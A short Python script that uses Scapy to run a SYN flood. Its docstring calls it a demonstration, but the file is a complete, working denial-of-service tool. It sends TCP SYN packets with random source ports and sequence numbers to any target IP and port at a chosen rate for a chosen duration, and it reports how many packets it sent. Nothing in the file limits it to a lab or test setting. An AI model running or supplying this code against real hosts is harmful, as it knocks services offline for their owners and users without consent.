from scapy.all import IP, TCP, send
import random
import time

def syn_flood(target_ip, target_port, duration, rate):
    """
    SYN Flood attack demonstration using Scapy.
    Sends TCP SYN packets to the target at a specified rate for a given duration.
    This often requires root privileges (sudo).
    """
    print(f"[INFO] Starting SYN flood on {target_ip}:{target_port} for {duration} seconds at ~{rate} pkts/sec.")
    start_time = time.time()

    packet_count = 0

    while True:
        current_time = time.time()
        if current_time - start_time > duration:
            break
        
        # Create a SYN packet
        source_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=source_port, dport=target_port, flags="S", seq=seq_num)
        
        # Send the packet
        send(ip_layer/tcp_layer, verbose=0)
        packet_count += 1

        # Simple rate control (sleep to roughly achieve packets per second)
        time.sleep(1 / rate)
    
    print(f"[INFO] SYN flood completed. Total packets sent: {packet_count}")
